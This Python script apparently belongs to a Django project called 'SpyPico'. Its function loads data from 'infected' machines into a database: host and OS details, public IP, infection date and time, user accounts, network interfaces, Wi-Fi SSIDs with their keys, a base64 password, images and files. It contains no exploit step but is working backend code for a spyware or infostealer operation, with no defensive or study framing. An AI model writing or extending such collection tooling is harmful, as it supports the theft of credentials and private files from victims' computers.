import os
import django
import sys

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'SpyPico.settings')
django.setup()

from backend.models import Maquina, Usuario, Red, Wifi, Password, Imagen, Archivo

def insert_into_db(datos):
    datos_maquina = datos.get("Maquina", {})
    machine = None
    if datos_maquina.get("OS Name"):
        machine = Maquina.objects.create(
            nombre=datos_maquina.get("whoami"),
            sistema_operativo=datos_maquina.get("OS Name"),
            version_sistema=datos_maquina.get("OS Version"),
            fabricante=datos_maquina.get("System Manufacturer"),
            modelo=datos_maquina.get("System Model"),
            ip_publica=datos.get("IP_Publica"),
            dominio=datos_maquina.get("Domain"),
            tiempo_de_infeccion_fecha=datos_maquina.get("Fecha_Infeccion", None),
            tiempo_de_infeccion_hora=datos_maquina.get("Hora_Infeccion", None)
        )
    elif datos_maquina.get("Nombre del sistema operativo"):
        machine = Maquina.objects.create(
            nombre=datos_maquina.get("whoami"),
            sistema_operativo=datos_maquina.get("Nombre del sistema operativo"),
            version_sistema=datos_maquina.get("Versión del sistema operativo"),
            fabricante=datos_maquina.get("Fabricante del sistema"),
            modelo=datos_maquina.get("Modelo del sistema", None),
            ip_publica=datos.get("IP_Publica"),
            dominio=datos_maquina.get("Dominio"),
            tiempo_de_infeccion_fecha=datos_maquina.get("Fecha de infección", None),
            tiempo_de_infeccion_hora=datos_maquina.get("Hora de infección", None)
        )
    datos_usuario = datos.get("Usuarios", {})
    for nombre, estado in datos_usuario.items():
        Usuario.objects.create(
            maquina=machine,
            nombre=nombre,
            estado=estado
        )
    datos_red = datos.get("Redes", [])
    for red in datos_red:
        Red.objects.create(
            maquina=machine,
            interfaz=red.get('Interfaz'),
            ip=red.get('IP')
        )
    for wifi in datos.get("Redes_WiFi", []):
        Wifi.objects.create(
            maquina=machine,
            ssid=wifi.get('SSID'),
            clave=wifi.get('Clave')
        )
    Password.objects.create(
        maquina=machine,
        clave_base64=datos.get("Clave_Base64", "")
    )
    for imagen in datos.get("Imagenes", []):
        Imagen.objects.create(
            maquina=machine,
            imagen=imagen
        )
    for archivo in datos.get("Archivos", []):
        Archivo.objects.create(
            maquina=machine,
            archivo=archivo
        )
    print("Datos insertados correctamente.")
    return machine
